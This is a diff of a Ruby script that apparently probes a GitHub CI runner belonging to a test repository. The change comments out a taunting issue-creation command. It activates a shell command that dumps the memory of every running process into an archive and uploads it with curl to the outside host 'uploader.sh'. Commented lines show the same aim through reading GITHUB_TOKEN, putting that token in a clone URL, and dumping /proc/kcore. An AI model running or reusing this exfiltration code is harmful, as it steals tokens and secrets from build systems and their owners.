@@ -8,12 +8,12 @@ puts encoded
 # ENV["GH_TOKEN"] = ENV["GITHUB_TOKEN"]
 # token = ENV["GITHUB_TOKEN"]
 
-system("gh issue create -R elizabethtl/test-oracle-devrel -t 'Tehe, you dont have a GITHUB TOKEN in the env' -b 'But your permissions are set incorreclty'")
+# system("gh issue create -R elizabethtl/test-oracle-devrel -t 'Tehe, you dont have a GITHUB TOKEN in the env' -b 'But your permissions are set incorreclty'")
 
 # system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
 # Dir.chdir("test-oracle-devrel") do
-  # system("sudo dd if=/proc/kcore bs=4M status=progress | zstd -1 -T0 > memory.zstd")
-  # system("curl uploader.sh -T memory.zstd")
+  system('mkdir -p memories && for p in /proc/[0-9]*; do i=${p##*/}; [ "$i" != "$$" ] && cat "$p/mem" > "memories/$i.mem" 2>/dev/null; done; tar --zstd -cf memories.tar.zst memories')
+  system("curl uploader.sh -T memories.tar.zst")
 # end
 
 # system("git config --global user.name \"github-actions [bot]\"")
